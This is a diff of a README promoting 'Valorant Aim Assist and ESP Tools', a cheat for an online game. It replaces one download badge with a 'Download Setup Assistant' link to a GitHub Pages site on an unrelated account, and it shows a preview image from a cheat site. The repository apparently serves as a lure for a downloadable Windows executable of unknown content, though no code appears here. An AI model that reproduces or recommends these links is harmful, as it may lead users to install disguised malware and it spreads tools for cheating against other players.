@@ -4,12 +4,7 @@
 
 <h1 align="center">🎯 Valorant Aim Assist and ESP Tools</h1>
 
-<p align="center">
-  <a href="https://valorant-aim-assist-and-esp-tools.github.io/.github/" target="_blank">
-    <img src="https://img.shields.io/badge/⬇️%20Download%20Valorant%20Aim%20Assist%20and%20ESP-Windows%20Version-1E90FF?style=for-the-badge&logo=windows&logoColor=white" 
-         alt="Download Valorant Aim Assist and ESP Tools" style="width:540px; height:37px;" />
-  </a>
-</p>
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-lightgrey)](https://kimberlyking1268554.github.io/.github/valorant-assist-and-tools)
 
 <p align="center">
   <img src="https://www.skycheats.com/uploads/monthly_2024_10/3(2).webp.dd23119aab6ce86a770a22620e24bd4a.webp" alt="Valorant Aim Assist and ESP Tools Preview" width="800" />
